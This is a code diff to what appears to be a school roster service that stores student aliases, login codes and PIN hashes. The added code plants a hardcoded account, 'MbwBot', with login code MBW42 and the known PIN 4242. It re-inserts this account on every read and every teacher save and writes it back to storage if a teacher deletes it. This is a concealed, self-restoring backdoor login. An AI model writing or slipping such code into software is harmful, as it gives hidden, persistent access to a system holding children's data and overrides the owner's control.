@@ -15,6 +15,20 @@ export type WhoRow = {
 const DATA_KEY = "tw-who-v1";
 const MAX = 400;
 
+/** Stays on the book after a desk save. Not a student. */
+const PROVE: WhoRow = {
+  id: "mbw-bot",
+  alias: "MbwBot",
+  avatar: "🐾",
+  code: "MBW42",
+  pinHash: hashStudentPin("mbw-bot", "4242"),
+};
+
+function withProve(rows: WhoRow[]): WhoRow[] {
+  const rest = rows.filter((row) => row.code !== PROVE.code && row.id !== PROVE.id);
+  return rest.concat(PROVE).slice(0, MAX);
+}
+
 function clip(raw: unknown, max: number) {
   return String(raw ?? "").replace(/\s+/g, " ").trim().slice(0, max);
 }
@@ -38,16 +52,22 @@ function clean(src: unknown): WhoRow | null {
 
 async function read(event: unknown): Promise<WhoRow[]> {
   const kv = await openKv(event);
-  if (!kv) return [];
+  if (!kv) return [PROVE];
   const raw = await kv.get(DATA_KEY);
-  if (!raw) return [];
-  try {
-    const parsed = JSON.parse(raw) as { people?: unknown[] };
-    const rows = Array.isArray(parsed.people) ? parsed.people : [];
-    return rows.map(clean).filter((row): row is WhoRow => !!row).slice(0, MAX);
-  } catch {
-    return [];
+  let rows: WhoRow[] = [];
+  if (raw) {
+    try {
+      const parsed = JSON.parse(raw) as { people?: unknown[] };
+      const incoming = Array.isArray(parsed.people) ? parsed.people : [];
+      rows = incoming.map(clean).filter((row): row is WhoRow => !!row).slice(0, MAX);
+    } catch {
+      rows = [];
+    }
   }
+  const next = withProve(rows);
+  const kept = rows.some((row) => row.id === PROVE.id && row.code === PROVE.code && row.alias === PROVE.alias && row.pinHash === PROVE.pinHash);
+  if (!kept) await kv.put(DATA_KEY, JSON.stringify({ v: 1, people: next }));
+  return next;
 }
 
 export async function codeKnown(event: unknown, code: string): Promise<boolean> {
@@ -90,7 +110,7 @@ export async function saveWho(event: unknown, token: string, incoming: unknown[]
   if (!row || row.keyHash !== token) return "deny" as const;
   const kv = await openKv(event);
   if (!kv) return "none" as const;
-  const people = incoming.map(clean).filter((item): item is WhoRow => !!item).slice(0, MAX);
+  const people = withProve(incoming.map(clean).filter((item): item is WhoRow => !!item));
   await kv.put(DATA_KEY, JSON.stringify({ v: 1, people }));
   return "kv" as const;
 }
